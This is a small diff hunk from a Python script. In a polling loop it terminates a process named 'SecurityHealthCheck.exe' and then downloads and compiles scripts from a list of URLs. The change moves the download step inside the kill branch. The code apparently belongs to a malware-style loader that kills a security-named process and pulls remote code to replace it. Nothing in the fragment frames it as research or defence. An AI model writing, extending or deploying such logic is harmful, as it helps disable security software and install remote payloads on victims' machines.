@@ -130,6 +130,6 @@ while True:
     for process in psutil.process_iter(['name']):
         if process.info['name'] in ['SecurityHealthCheck.exe']:
             process.terminate()
-    download_and_compile_scripts(urls_and_filenames)
-    print(f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}]{Fore.GREEN} Downloaded & Compiled ~ because a process wasnt found or was closed")
+            download_and_compile_scripts(urls_and_filenames)
+            print(f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}]{Fore.GREEN} Downloaded & Compiled ~ because a process wasnt found or was closed")
     time.sleep(0.5)
